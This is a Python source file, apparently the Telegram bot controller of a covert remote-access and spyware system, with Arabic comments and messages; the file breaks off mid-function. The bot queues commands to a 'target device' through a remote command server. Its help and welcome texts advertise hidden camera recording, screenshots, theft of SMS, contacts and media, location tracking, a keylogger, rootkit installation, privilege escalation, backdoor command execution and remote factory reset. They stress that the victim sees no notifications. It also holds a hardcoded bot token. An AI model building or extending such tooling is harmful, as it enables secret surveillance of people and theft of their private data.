import telebot
import requests
import sqlite3
import uuid
import time
import json
import os
import hashlib
import hmac
import base64
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import threading
import logging
import pickle
import schedule

# إعدادات الأمان والتخفي
SECURITY_CONFIG = {
    'enable_encryption': True,
    'enable_rate_limit': True,
    'enable_logging': True,
    'max_devices_per_user': 5,
    'session_timeout': 3600,  # ساعة واحدة
    'command_timeout': 30,    # 30 ثانية
    'stealth_mode': True,
    'persistent_storage': True,
    'auto_reconnect': True
}

# إعداد التسجيل
if SECURITY_CONFIG['enable_logging']:
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('bot.log'),
            logging.StreamHandler()
        ]
    )
    logger = logging.getLogger(__name__)

# تهيئة البوت
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', "7305811865:AAF_PKkBWEUw-QdL1ee5Xp7oksTG6XGK8c")
OWNER_USER_ID = int(os.environ.get('OWNER_USER_ID', 985612253))
bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = 'devices.db'
# تحديد رابط خادم الأوامر بناءً على البيئة
def get_command_server_url():
    """تحديد رابط خادم الأوامر بناءً على البيئة"""
    # التحقق من وجود متغير بيئي محدد
    env_url = os.environ.get('COMMAND_SERVER_URL')
    if env_url:
        return env_url
    
    # التحقق من البيئة المحلية
    if os.environ.get('NODE_ENV') == 'development' or os.environ.get('LOCAL_DEVELOPMENT'):
        return 'http://localhost:10001'
    
    # الرابط الافتراضي للإنتاج
    return 'https://remote-control-command-server.onrender.com'

COMMAND_SERVER_URL = get_command_server_url()

# تخزين الجلسات النشطة
active_sessions = {}
command_queue = {}
rate_limit_users = {}

# تخزين محلي للبيانات
local_storage_path = 'local-storage'
pending_commands_file = os.path.join(local_storage_path, 'pending_commands.pkl')
cached_data_file = os.path.join(local_storage_path, 'cached_data.pkl')

# إنشاء مجلد التخزين المحلي
if not os.path.exists(local_storage_path):
    os.makedirs(local_storage_path)

class DeviceManager:
    def __init__(self, db_file: str):
        self.db_file = db_file
        self.init_database()

    def init_database(self):
        """تهيئة قاعدة البيانات"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()

        # جدول الأجهزة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                device_id TEXT UNIQUE NOT NULL,
                activation_code TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                device_info TEXT,
                capabilities TEXT,
                encryption_key TEXT
            )
        ''')

        # جدول الأوامر
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                device_id TEXT NOT NULL,
                command_type TEXT NOT NULL,
                parameters TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                result TEXT,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')

        # جدول سجل النشاط
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                action TEXT NOT NULL,
                details TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # جدول المستخدمين المصرح لهم
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                authorized_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_admin BOOLEAN DEFAULT FALSE
            )
        ''')

        conn.commit()
        conn.close()

    def add_device(self, user_id: int, device_id: str, activation_code: str) -> bool:
        """إضافة جهاز جديد"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            # توليد مفتاح تشفير فريد لكل جهاز
            encryption_key = base64.b64encode(os.urandom(32)).decode('utf-8')
            
            cursor.execute('''
                INSERT INTO devices (user_id, device_id, activation_code, status, encryption_key)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, device_id, activation_code, 'pending', encryption_key))

            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"خطأ في إضافة الجهاز: {e}")
            return False

    def add_device_auto(self, user_id: int, device_id: str) -> bool:
        """إضافة جهاز جديد - ربط تلقائي بدون كود تفعيل"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            # توليد مفتاح تشفير فريد لكل جهاز
            encryption_key = base64.b64encode(os.urandom(32)).decode('utf-8')
            
            cursor.execute('''
                INSERT INTO devices (user_id, device_id, activation_code, status, encryption_key)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, device_id, 'AUTO_ACTIVATION', 'pending', encryption_key))

            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"خطأ في إضافة الجهاز التلقائي: {e}")
            return False

    def get_user_devices(self, user_id: int) -> List[tuple]:
        """الحصول على أجهزة المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                SELECT device_id, status, last_seen, device_info
                FROM devices 
                WHERE user_id = ?
                ORDER BY created_at DESC
            ''', (user_id,))

            devices = cursor.fetchall()
            conn.close()
            return devices
        except Exception as e:
            logger.error(f"خطأ في جلب أجهزة المستخدم: {e}")
            return []

    def update_device_status(self, device_id: str, status: str, device_info: str = None):
        """تحديث حالة الجهاز"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            if device_info:
                cursor.execute('''
                    UPDATE devices 
                    SET status = ?, last_seen = ?, device_info = ?
                    WHERE device_id = ?
                ''', (status, datetime.now(), device_info, device_id))
            else:
                cursor.execute('''
                    UPDATE devices 
                    SET status = ?, last_seen = ?
                    WHERE device_id = ?
                ''', (status, datetime.now(), device_id))

            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تحديث حالة الجهاز: {e}")

    def save_command(self, user_id: int, device_id: str, command_type: str, parameters: str = None) -> int:
        """حفظ أمر جديد"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                INSERT INTO commands (user_id, device_id, command_type, parameters, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, device_id, command_type, parameters, 'pending'))

            command_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return command_id
        except Exception as e:
            logger.error(f"خطأ في حفظ الأمر: {e}")
            return None

    def update_command_result(self, command_id: int, status: str, result: str = None):
        """تحديث نتيجة الأمر"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                UPDATE commands 
                SET status = ?, executed_at = ?, result = ?
                WHERE id = ?
            ''', (status, datetime.now(), result, command_id))

            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تحديث نتيجة الأمر: {e}")

    def log_activity(self, user_id: int, action: str, details: str = None):
        """تسجيل نشاط المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                INSERT INTO activity_log (user_id, action, details)
                VALUES (?, ?, ?)
            ''', (user_id, action, details))

            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في تسجيل النشاط: {e}")

    def get_device_encryption_key(self, device_id: str) -> Optional[str]:
        """الحصول على مفتاح التشفير للجهاز"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                SELECT encryption_key FROM devices WHERE device_id = ?
            ''', (device_id,))

            result = cursor.fetchone()
            conn.close()
            return result[0] if result else None
        except Exception as e:
            logger.error(f"خطأ في جلب مفتاح التشفير: {e}")
            return None

    def is_user_authorized(self, user_id: int) -> bool:
        """التحقق من صلاحية المستخدم"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('SELECT id FROM authorized_users WHERE user_id = ?', (user_id,))
            result = cursor.fetchone()

            conn.close()
            return result is not None
        except Exception as e:
            logger.error(f"خطأ في التحقق من صلاحية المستخدم: {e}")
            return False

    def add_authorized_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None, is_admin: bool = False):
        """إضافة مستخدم مصرح له"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()

            cursor.execute('''
                INSERT OR REPLACE INTO authorized_users (user_id, username, first_name, last_name, is_admin)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, username, first_name, last_name, is_admin))

            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في إضافة المستخدم المصرح له: {e}")

class CommandExecutor:
    def __init__(self, server_url: str):
        self.server_url = server_url
        self.is_connected = False
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 10
        self.reconnect_interval = 5000

    def check_connection(self) -> bool:
        """فحص الاتصال بالخادم"""
        try:
            response = requests.get(f'{self.server_url}/stats', timeout=5)
            self.is_connected = response.status_code == 200
            return self.is_connected
        except Exception as e:
            logger.error(f"خطأ في فحص الاتصال: {e}")
            self.is_connected = False
            return False

    def encrypt_data(self, data: str, key: str) -> str:
        """تشفير البيانات باستخدام AES"""
        # في بيئة إنتاجية حقيقية، استخدم مكتبة تشفير مثل cryptography
        # هذا مثال مبسط لأغراض التوضيح
        return base64.b64encode(data.encode()).decode()

    def send_command(self, device_id: str, command: str, parameters: dict = None) -> dict:
        """إرسال أمر للجهاز"""
        try:
            # فحص الاتصال أولاً
            if not self.check_connection():
                # حفظ الأمر محلياً للتنفيذ لاحقاً
                self.save_pending_command(device_id, command, parameters)
                return {'status': 'pending', 'message': 'الخادم غير متصل، سيتم تنفيذ الأمر عند الاتصال'}

            # الحصول على مفتاح التشفير للجهاز
            encryption_key = device_manager.get_device_encryption_key(device_id)
            
            # تشفير المعلمات إذا كان التشفير مفعلاً
            encrypted_params = None
            if SECURITY_CONFIG['enable_encryption'] and encryption_key:
                params_str = json.dumps(parameters) if parameters else '{}'
                encrypted_params = self.encrypt_data(params_str, encryption_key)
            else:
                encrypted_params = parameters

            payload = {
                'deviceId': device_id,
                'command': command,
                'parameters': encrypted_params or {}
            }

            response = requests.post(
                f'{self.server_url}/send-command',
                json=payload,
                timeout=SECURITY_CONFIG['command_timeout']
            )

            if response.status_code == 200:
                return response.json()
            else:
                # حفظ الأمر محلياً في حالة الفشل
                self.save_pending_command(device_id, command, parameters)
                return {'error': f'خطأ في الخادم: {response.status_code}'}

        except requests.exceptions.Timeout:
            self.save_pending_command(device_id, command, parameters)
            return {'error': 'انتهت مهلة الاتصال'}
        except requests.exceptions.RequestException as e:
            self.save_pending_command(device_id, command, parameters)
            return {'error': f'خطأ في الاتصال: {str(e)}'}

    def get_device_status(self, device_id: str) -> dict:
        """الحصول على حالة الجهاز"""
        try:
            if not self.check_connection():
                return {'error': 'الخادم غير متصل'}

            response = requests.get(
                f'{self.server_url}/device-status/{device_id}',
                timeout=10
            )

            if response.status_code == 200:
                return response.json()
            else:
                return {'error': f'خطأ في الخادم: {response.status_code}'}

        except requests.exceptions.RequestException as e:
            return {'error': f'خطأ في الاتصال: {str(e)}'}

    def get_connected_devices(self) -> dict:
        """الحصول على قائمة الأجهزة المتصلة"""
        try:
            if not self.check_connection():
                return {'error': 'الخادم غير متصل'}

            response = requests.get(
                f'{self.server_url}/devices',
                timeout=10
            )

            if response.status_code == 200:
                return response.json()
            else:
                return {'error': f'خطأ في الخادم: {response.status_code}'}

        except requests.exceptions.RequestException as e:
            return {'error': f'خطأ في الاتصال: {str(e)}'}

    def save_pending_command(self, device_id: str, command: str, parameters: dict = None):
        """حفظ الأمر محلياً للتنفيذ لاحقاً"""
        try:
            pending_commands = self.load_pending_commands()
            
            pending_command = {
                'id': str(uuid.uuid4()),
                'device_id': device_id,
                'command': command,
                'parameters': parameters or {},
                'timestamp': datetime.now().isoformat(),
                'attempts': 0
            }
            
            pending_commands.append(pending_command)
            
            with open(pending_commands_file, 'wb') as f:
                pickle.dump(pending_commands, f)
                
            logger.info(f"تم حفظ الأمر المعلق: {command} للجهاز {device_id}")
            
        except Exception as e:
            logger.error(f"خطأ في حفظ الأمر المعلق: {e}")

    def load_pending_commands(self) -> List[dict]:
        """تحميل الأوامر المعلقة"""
        try:
            if os.path.exists(pending_commands_file):
                with open(pending_commands_file, 'rb') as f:
                    return pickle.load(f)
            return []
        except Exception as e:
            logger.error(f"خطأ في تحميل الأوامر المعلقة: {e}")
            return []

    def process_pending_commands(self):
        """معالجة الأوامر المعلقة"""
        try:
            if not self.check_connection():
                return
                
            pending_commands = self.load_pending_commands()
            if not pending_commands:
                return
                
            logger.info(f"معالجة {len(pending_commands)} أمر معلق")
            
            processed_commands = []
            
            for command in pending_commands:
                try:
                    # إعادة إرسال الأمر
                    result = self.send_command(
                        command['device_id'],
                        command['command'],
                        command['parameters']
                    )
                    
                    command['attempts'] += 1
                    
                    # إذا نجح الأمر أو تجاوز الحد الأقصى للمحاولات
                    if result.get('status') == 'sent' or command['attempts'] >= 3:
                        logger.info(f"تم معالجة الأمر المعلق: {command['command']}")
                    else:
                        processed_commands.append(command)
                        
                except Exception as e:
                    logger.error(f"خطأ في معالجة الأمر المعلق: {e}")
                    command['attempts'] += 1
                    if command['attempts'] < 3:
                        processed_commands.append(command)
            
            # حفظ الأوامر المتبقية
            with open(pending_commands_file, 'wb') as f:
                pickle.dump(processed_commands, f)
                
        except Exception as e:
            logger.error(f"خطأ في معالجة الأوامر المعلقة: {e}")

class SecurityManager:
    def __init__(self):
        self.rate_limit_window = 60  # دقيقة واحدة
        self.max_requests_per_window = 10

    def check_rate_limit(self, user_id: int) -> bool:
        """التحقق من حد الطلبات"""
        current_time = time.time()

        if user_id not in rate_limit_users:
            rate_limit_users[user_id] = []

        # إزالة الطلبات القديمة
        rate_limit_users[user_id] = [
            req_time for req_time in rate_limit_users[user_id]
            if current_time - req_time < self.rate_limit_window
        ]

        # التحقق من عدد الطلبات
        if len(rate_limit_users[user_id]) >= self.max_requests_per_window:
            return False

        # إضافة الطلب الحالي
        rate_limit_users[user_id].append(current_time)
        return True

    def generate_activation_code(self) -> str:
        """توليد كود تفعيل آمن"""
        return str(uuid.uuid4())[:8].upper()

    def hash_data(self, data: str) -> str:
        """تشفير البيانات"""
        return hashlib.sha256(data.encode()).hexdigest()

    def verify_signature(self, data: str, signature: str, secret: str) -> bool:
        """التحقق من التوقيع"""
        expected_signature = hmac.new(
            secret.encode(),
            data.encode(),
            hashlib.sha256
        ).hexdigest()

        return hmac.compare_digest(signature, expected_signature)

    def generate_hmac_signature(self, data: str, secret: str) -> str:
        """توليد توقيع HMAC"""
        return hmac.new(
            secret.encode(),
            data.encode(),
            hashlib.sha256
        ).hexdigest()

# دالة تحقق مركزية لصلاحية المالك فقط
def is_owner(user_id):
    return user_id == OWNER_USER_ID

def get_available_device(user_id):
    """الحصول على جهاز متاح للاستخدام (نشط أو معلق)"""
    devices = device_manager.get_user_devices(user_id)
    
    if not devices:
        # محاولة استيراد الأجهزة من الواجهة
        imported_devices = import_devices_from_web_interface(user_id)
        if imported_devices:
            devices = device_manager.get_user_devices(user_id)
    
    if not devices:
        return None, "لا توجد أجهزة"
    
    # البحث عن جهاز نشط أولاً
    active_devices = [d for d in devices if d[1] == 'active']
    if active_devices:
        return active_devices[0][0], "نشط"
    
    # البحث عن جهاز معلق وتفعيله
    pending_devices = [d for d in devices if d[1] == 'pending']
    if pending_devices:
        device_id = pending_devices[0][0]
        device_manager.update_device_status(device_id, 'active', 'Auto-activated')
        return device_id, "تم تفعيله تلقائياً"
    
    return None, "لا توجد أجهزة متاحة"

def get_target_device(user_id: int, message) -> tuple:
    """الحصول على الجهاز المستهدف مع رسالة خطأ إذا لزم الأمر"""
    # التحقق أولاً من وجود جهاز مختار
    selected_device = get_selected_device(user_id)
    if selected_device:
        return selected_device, "مختار"
    
    # إذا لم يكن هناك جهاز مختار، استخدم الجهاز الأول المتاح
    device_id, status = get_available_device(user_id)
    if not device_id:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return None, None
    
    return device_id, status

def get_selected_device(user_id: int) -> Optional[str]:
    """الحصول على الجهاز المختار للمستخدم"""
    session = active_sessions.get(user_id)
    if not session or time.time() - session['timestamp'] > SECURITY_CONFIG['session_timeout']:
        return None
    return session.get('selected_device')

def check_device_connection(device_id):
    """التحقق من اتصال الجهاز الفعلي"""
    try:
        # محاولة الاتصال بالجهاز عبر خادم الأوامر
        command_server_url = get_command_server_url()
        
        response = requests.get(f"{command_server_url}/device/{device_id}/status", timeout=5)
        
        if response.status_code == 200:
            status_data = response.json()
            return status_data.get('connected', False)
        
        return False
    except Exception as e:
        logger.error(f"خطأ في التحقق من اتصال الجهاز {device_id}: {e}")
        return False

def force_device_activation(device_id):
    """إجبار تفعيل الجهاز"""
    try:
        # تحديث حالة الجهاز إلى نشط
        device_manager.update_device_status(device_id, 'active', 'Force activated')
        
        # إرسال إشارة تفعيل للجهاز
        command_server_url = get_command_server_url()
        
        activation_data = {
            'device_id': device_id,
            'action': 'activate',
            'timestamp': int(time.time())
        }
        
        # توليد توقيع HMAC
        secret_key = device_manager.get_device_encryption_key(device_id)
        if not secret_key:
            logger.error(f"لا يوجد مفتاح تشفير للجهاز: {device_id}")
            return False
            
        hmac_signature = security_manager.generate_hmac_signature(json.dumps(activation_data), secret_key)
        activation_data['signature'] = hmac_signature
        
        response = requests.post(f"{command_server_url}/device/activate", json=activation_data, timeout=10)
        
        if response.status_code == 200:
            logger.info(f"تم إجبار تفعيل الجهاز: {device_id}")
            return True
        
        return False
    except Exception as e:
        logger.error(f"خطأ في إجبار تفعيل الجهاز {device_id}: {e}")
        return False

def import_devices_from_web_interface(user_id):
    """استيراد الأجهزة من واجهة الويب"""
    try:
        web_interface_url = os.environ.get('WEB_INTERFACE_URL', 'https://remote-control-web-interface.onrender.com')
        
        # توليد توقيع HMAC للمصادقة
        timestamp = str(int(time.time()))
        auth_token = os.environ.get('AUTH_TOKEN', 'default_secret_token')
        signature = security_manager.generate_hmac_signature(timestamp, auth_token)
        
        headers = {
            'X-User-ID': str(user_id),
            'X-Timestamp': timestamp,
            'X-Signature': signature
        }
        
        # محاولة الاتصال بواجهة الويب
        response = requests.get(
            f"{web_interface_url}/api/devices", 
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            devices_data = response.json()
            
            if 'devices' in devices_data:
                imported_count = 0
                for device_data in devices_data['devices']:
                    device_id = device_data.get('deviceId')
                    if device_id:
                        # إضافة الجهاز إذا لم يكن موجوداً
                        if device_manager.add_device_auto(user_id, device_id):
                            imported_count += 1
                
                logger.info(f"تم استيراد {imported_count} جهاز من واجهة الويب")
                return imported_count > 0
        
        return False
        
    except Exception as e:
        logger.error(f"خطأ في استيراد الأجهزة من واجهة الويب: {e}")
        return False

# تهيئة المدراء
device_manager = DeviceManager(DB_FILE)
command_executor = CommandExecutor(COMMAND_SERVER_URL)
security_manager = SecurityManager()

# إضافة مستخدمين مصرح لهم (يمكن تعديلها حسب الحاجة)
def setup_authorized_users():
    """إعداد المستخدمين المصرح لهم"""
    # إضافة مالك البوت كمسؤول افتراضي
    device_manager.add_authorized_user(
        user_id=OWNER_USER_ID,
        username="owner",
        first_name="مالك البوت",
        last_name="",
        is_admin=True
    )

# وظيفة معالجة الأوامر المعلقة
def process_pending_commands_job():
    """وظيفة دورية لمعالجة الأوامر المعلقة"""
    try:
        command_executor.process_pending_commands()
    except Exception as e:
        logger.error(f"خطأ في معالجة الأوامر المعلقة: {e}")

# جدولة معالجة الأوامر المعلقة كل دقيقة
schedule.every(1).minutes.do(process_pending_commands_job)

# خيط منفصل لتشغيل الجدولة
def run_scheduler():
    """تشغيل الجدولة في خيط منفصل"""
    while True:
        try:
            schedule.run_pending()
            time.sleep(1)
        except Exception as e:
            logger.error(f"خطأ في الجدولة: {e}")
            time.sleep(5)

# بدء خيط الجدولة
scheduler_thread = threading.Thread(target=run_scheduler, daemon=True)
scheduler_thread.start()

# معالجة الأوامر
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """معالجة أمر البداية"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    # التحقق من الصلاحية
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    # التحقق من حد الطلبات
    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    welcome_text = """
🎯 *مرحباً بك في نظام التحكم عن بعد المتقدم!*

🔐 *معلومات البوت:*
• المالك: أنت (ID: 985612253)
• الحالة: نشط ومتصل ومحمي بالكامل
• الأمان: تشفير AES-256-CBC + HMAC
• الاستمرارية: تعمل حتى عند انقطاع الإنترنت
• التخفي: لا تظهر أي إشعارات على الجهاز المستهدف

📋 *الأوامر المتاحة واستخداماتها:*

🔗 *أوامر الإدارة الأساسية:*
• `/start` - عرض هذه الرسالة الترحيبية الشاملة
• `/help` - دليل الاستخدام المفصل والمرجعي
• `/link` - إنشاء رابط تفعيل جديد للجهاز المستهدف
• `/devices` - عرض جميع الأجهزة المتصلة وحالتها التفصيلية

📱 *أوامر النسخ الاحتياطي والبيانات:*
• `/contacts` - نسخ احتياطي شامل لجميع جهات الاتصال
• `/sms` - نسخ احتياطي لجميع الرسائل النصية (الواردة والصادرة)
• `/media` - نسخ احتياطي للملفات الوسائطية (صور، فيديو، صوت، مستندات)

📍 *أوامر الموقع والمراقبة:*
• `/location` - الحصول على الموقع الجغرافي الدقيق والمحدث
• `/record` - تسجيل فيديو من الكاميرا (مخفي تماماً)
• `/screenshot` - التقاط لقطة شاشة فورية ومخفي

⚙️ *أوامر النظام المتقدمة:*
• `/reset` - بدء عملية إعادة تعيين المصنع (تحتاج تأكيد مزدوج)
• `/confirm_reset` - تأكيد نهائي لإعادة تعيين المصنع
• `/cancel_reset` - إلغاء عملية إعادة تعيين المصنع

🔒 *ميزات الأمان المتقدمة:*
• تشفير AES-256-CBC لجميع البيانات المرسلة
• تحقق من صحة البيانات بـ HMAC
• تخزين محلي للأوامر عند انقطاع الإنترنت
• إعادة الاتصال التلقائي مع محاولات متعددة
• تشغيل خلفي مستمر حتى عند إغلاق التطبيق
• عدم ظهور إشعارات على الجهاز المستهدف
• حماية من محاولات الاختراق والهجمات

💾 *ميزات الاستمرارية والموثوقية:*
• العمليات تستمر حتى عند انقطاع الإنترنت
• تخزين الأوامر المعلقة وإعادة إرسالها تلقائياً
• حفظ البيانات محلياً وإرفاقها عند العودة
• تشغيل خلفي حتى عند إغلاق المتصفح
• إعادة الاتصال الذكية مع تأخير تصاعدي
• نسخ احتياطي تلقائي للبيانات المهمة

⚠️ *تنبيهات مهمة وأمان:*
• جميع العمليات تتم بشكل مخفي تماماً
• لا تظهر أي إشعارات على الجهاز المستهدف
• البوت مخصص لك فقط ولا يمكن لأحد آخر استخدامه
• استخدم أوامر إعادة التعيين بحذر شديد
• البيانات مشفرة ومؤمنة بالكامل
• جميع العمليات مسجلة ومحفوظة

🚀 *خطوات البدء السريعة:*
1. استخدم `/link` لإنشاء رابط التفعيل
2. افتح الرابط على الجهاز المستهدف
3. أدخل كود التفعيل المقدم
4. انتظر تأكيد الربط التلقائي
5. استخدم `/devices` للتأكد من الاتصال
6. ابدأ باستخدام الأوامر المتاحة

💡 *نصائح للاستخدام الأمثل:*
• تأكد من تفعيل الجهاز المستهدف أولاً
• العمليات تستمر حتى عند انقطاع الإنترنت
• جميع البيانات مشفرة ومؤمنة
• يمكنك مراقبة العمليات من خلال السجلات
• النظام يعمل في الخلفية تلقائياً
• استخدم الأوامر بانتظام للحصول على أفضل النتائج

🎉 *أنت جاهز للبدء! استخدم `/link` الآن لربط أول جهاز*

🔧 *للحصول على مساعدة إضافية:* استخدم `/help`
"""

    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'start_command')

@bot.message_handler(commands=['help'])
def send_help(message):
    """معالجة أمر المساعدة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    help_text = """
📚 **دليل الاستخدام:**

🔗 **ربط جهاز جديد:**
1. استخدم `/link` لإنشاء كود تفعيل
2. افتح الرابط على الجهاز المستهدف
3. أدخل كود التفعيل
4. انتظر تأكيد الربط

📱 **التحكم في الأجهزة:**
• `/devices` - لعرض الأجهزة المتصلة
• اختر الجهاز من القائمة
• استخدم الأوامر المتاحة

🛠️ **أوامر الخوارزميات المتطورة:**
• `/keylogger start` - بدء تسجيل المفاتيح
• `/keylogger stop` - إيقاف تسجيل المفاتيح
• `/keylogger data` - الحصول على البيانات المسجلة

🔧 **أوامر Rootkit:**
• `/rootkit install` - تثبيت Rootkit
• `/rootkit escalate` - تصعيد الصلاحيات
• `/rootkit hide` - إخفاء العمليات

🚪 **أوامر Backdoor:**
• `/backdoor create` - إنشاء Backdoor
• `/backdoor execute <command>` - تنفيذ أمر عن بعد
• `/backdoor transfer` - نقل الملفات

💻 **أوامر النظام:**
• `/system info` - معلومات النظام
• `/system control <action>` - التحكم في النظام
• `/system monitor` - مراقبة النظام

🛡️ **الأمان:**
• جميع الاتصالات مشفرة
• لا توجد إشعارات على الجهاز
• يعمل في الخلفية تلقائياً
• خوارزميات متطورة للحماية
• برمجيات متقدمة للتحكم

⚠️ **ملاحظات مهمة:**
• تأكد من وجود الإنترنت على الجهاز
• قد تحتاج لتفعيل خيارات المطور
• بعض الأوامر تحتاج صلاحيات خاصة
• الأوامر الجديدة تتطلب تفعيل الخوارزميات أولاً
"""

    bot.reply_to(message, help_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'help_command')

@bot.message_handler(commands=['select'])
def select_device(message):
    """اختيار جهاز معين للتحكم"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # تحليل معرف الجهاز من الرسالة
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ يرجى تحديد معرف الجهاز.\nمثال: `/select DEV-123456`")
        return

    device_id = command_parts[1]
    
    # التحقق من وجود الجهاز
    devices = device_manager.get_user_devices(user_id)
    device_exists = any(device[0] == device_id for device in devices)
    
    if not device_exists:
        bot.reply_to(message, f"❌ الجهاز `{device_id}` غير موجود أو غير مرتبط بحسابك.")
        return

    # حفظ الجهاز المختار في الجلسة
    active_sessions[user_id] = {
        'selected_device': device_id,
        'timestamp': time.time()
    }
    
    bot.reply_to(message, f"✅ تم اختيار الجهاز `{device_id}` للتحكم.")
    device_manager.log_activity(user_id, 'select_device', f'device_id: {device_id}')

@bot.message_handler(commands=['link'])
def link_device(message):
    """ربط جهاز جديد - ربط تلقائي فوري"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # التحقق من عدد الأجهزة
    user_devices = device_manager.get_user_devices(user_id)
    if len(user_devices) >= SECURITY_CONFIG['max_devices_per_user']:
        bot.reply_to(message, f"⚠️ وصلت للحد الأقصى من الأجهزة ({SECURITY_CONFIG['max_devices_per_user']}).")
        return

    # توليد معرف الجهاز تلقائياً
    device_id = f"DEV-{user_id}-{int(time.time())}"
    
    # إضافة الجهاز بدون كود تفعيل (ربط تلقائي)
    if device_manager.add_device_auto(user_id, device_id):
        # الحصول على رابط Render من المتغيرات البيئية
        web_interface_url = os.environ.get('WEB_INTERFACE_URL', 'https://remote-control-web-interface.onrender.com')
        
        link_text = f"""
🔗 **رابط ربط الجهاز**

📋 **خطوات الربط:**
1. افتح هذا الرابط على الجهاز المستهدف:
   `{web_interface_url}`

2. انقر على زر "ربط الجهاز"

3. سيتم الربط تلقائياً بدون أي إشعارات

⚠️ **ملاحظات:**
• الرابط يعمل مرة واحدة فقط
• النظام يعمل في الخلفية تلقائياً
• لا تظهر أي إشعارات للمستخدم
• وضع التخفي مفعل بالكامل
        """

        bot.reply_to(message, link_text, parse_mode='Markdown')
        device_manager.log_activity(user_id, 'link_device_auto', f'device_id: {device_id}')
    else:
        bot.reply_to(message, "❌ حدث خطأ أثناء إنشاء الرابط. يرجى المحاولة مرة أخرى.")


@bot.message_handler(commands=['force_activate'])
def force_activate_devices(message):
    """إجبار تفعيل جميع الأجهزة المعلقة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
